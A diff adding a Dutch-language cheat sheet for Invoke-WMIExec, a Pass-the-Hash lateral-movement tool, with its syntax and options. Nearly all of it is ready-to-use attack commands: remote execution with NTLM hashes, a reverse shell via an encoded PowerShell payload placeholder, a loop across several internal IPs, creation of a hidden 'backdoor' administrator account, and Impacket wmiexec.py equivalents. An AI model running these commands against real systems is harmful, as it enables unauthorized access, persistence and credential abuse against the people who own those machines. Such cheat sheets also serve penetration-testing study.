@@ -1,0 +1,42 @@
+# Invoke-WMIExec — WMI command execution met Pass-the-Hash
+# Voert commando's uit op remote systemen via WMI met een NTLM hash
+#
+# === Syntax ===
+# Invoke-WMIExec -Target TARGET -Username USER -Domain DOMAIN -Hash HASH [-Command "cmd"]
+#
+# === Werking ===
+# Gebruikt WMI (Windows Management Instrumentation) om remote commando's
+# uit te voeren via Pass-the-Hash. Geen plaintext wachtwoord nodig.
+#
+# === Opties ===
+# -Target       Doel IP of hostname
+# -Username     Gebruikersnaam
+# -Domain       Domeinnaam (of . voor lokaal)
+# -Hash         NTLM hash (32 hex karakters)
+# -Command      Commando om uit te voeren
+# -Sleep        Vertraging in milliseconden (standaard: 10)
+#
+# === Voorbeelden ===
+
+# Commando uitvoeren op remote systeem
+Invoke-WMIExec -Target TARGET -Username USER -Domain DOMAIN -Hash HASH -Command "whoami"
+
+# Reverse shell starten
+Invoke-WMIExec -Target TARGET -Username USER -Domain DOMAIN -Hash HASH -Command "powershell -e BASE64_PAYLOAD"
+
+# Lokaal account gebruiken (Domain = .)
+Invoke-WMIExec -Target TARGET -Username Administrator -Domain . -Hash HASH -Command "ipconfig /all"
+
+# Meerdere targets in een loop
+@("10.10.10.1","10.10.10.2","10.10.10.3") | ForEach-Object { Invoke-WMIExec -Target $_ -Username USER -Domain DOMAIN -Hash HASH -Command "hostname" }
+
+# Gebruiker toevoegen op remote systeem
+Invoke-WMIExec -Target TARGET -Username USER -Domain DOMAIN -Hash HASH -Command "net user backdoor P@ssw0rd123 /add && net localgroup Administrators backdoor /add"
+
+# Impacket variant (Linux)
+wmiexec.py DOMAIN/USER@TARGET -hashes :HASH
+wmiexec.py DOMAIN/USER:PASS@TARGET
+
+# NOTE: Vereist local admin rechten op het doelsysteem
+# NOTE: WMI gebruikt poort 135 (RPC) + dynamische poorten
+# NOTE: Laat sporen achter in WMI event logs
